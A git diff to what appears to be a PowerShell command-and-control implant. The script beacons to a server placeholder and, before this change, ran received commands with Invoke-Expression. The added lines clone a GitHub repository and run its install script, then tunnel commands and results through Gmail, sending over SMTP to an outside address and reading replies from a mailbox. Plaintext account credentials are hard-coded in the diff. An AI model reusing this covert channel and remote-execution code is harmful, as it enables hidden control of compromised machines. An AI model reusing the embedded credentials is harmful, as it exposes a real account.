@@ -1,6 +1,8 @@
 $TASK_CHECK_INTERVAL = OCU_INTERVAL;
 $AES_KEY = "OCT_KEY";
 $AES_IV = "OCT_IV"
+git clone https://github.com/nikoblag/Gmail.ps.git
+.\Gmail.ps\install.ps1
 
 function Create-AesManagedObject($AES_KEY, $AES_IV) {
     $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
@@ -142,7 +144,46 @@ while($true){
         $wc3.downloadString("OCU_PROTO://SRVHOST/OCTRECV");
     } else{
       try{
-        $ec = Invoke-Expression ($fc) | Out-String;
+        $username = "svhilimem@gmail.com"
+        $password = "123123123Vl!"
+
+	[SecureString]$securepassword = $password | ConvertTo-SecureString -AsPlainText -Force 
+	$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $securepassword
+	#$Bytes = [System.Text.Encoding]::Unicode.GetBytes($fc)
+	#$EncodedText =[Convert]::ToBase64String($Bytes)	
+	$commands_send_via_gmail = 'VFIZMR'  + $fc + 'RMZIFV' 
+	Send-MailMessage -SmtpServer smtp.gmail.com -Port 587 -UseSsl -From svhilimem@gmail.com -To vladif@bugsec.com -Subject 'Babylon' -Body $commands_send_via_gmail -Credential $credential
+	echo "Sleeping ..."
+	Start-Sleep -s 30
+
+	Clear-GmailSession
+	[securestring]$secStringPassword = ConvertTo-SecureString $password -AsPlainText -Force
+	$Credentials = New-Object System.Management.Automation.PSCredential ($username, $secStringPassword)
+	$Session = New-GmailSession -Credential $credentials
+	$Message = $Session | Get-Mailbox
+	$msg = $Message | Get-Message -Subject "VLFI" -Prefetch
+	$length = $msg.Length
+	$ec = $msg[$length-1].Body | Out-String;
+
+
+	# load rss-feed
+   	#$webclient = new-object System.Net.WebClient
+
+   	# access the rss-feed
+   	#$webclient.Credentials = new-object System.Net.NetworkCredential ("svhilimem@gmail.com", "123123123Vl!")
+
+   	# download the rss as xml
+   	#[xml]$xml= $webclient.DownloadString("https://mail.google.com/mail/feed/atom")
+
+   	# display only sender name and message title as custom table
+   	#$format= @{Expression={$_.summary};Label="summary"}
+
+   	# display the table
+   	#$ec = $xml.feed.entry[0] | Select-Object -Property summary | Out-String -stream | select-object -skip 3
+           
+
+
+	#$ec = Invoke-Expression ($fc) | Out-String;
         }
         catch{
         $ec = $Error[0] | Out-String;
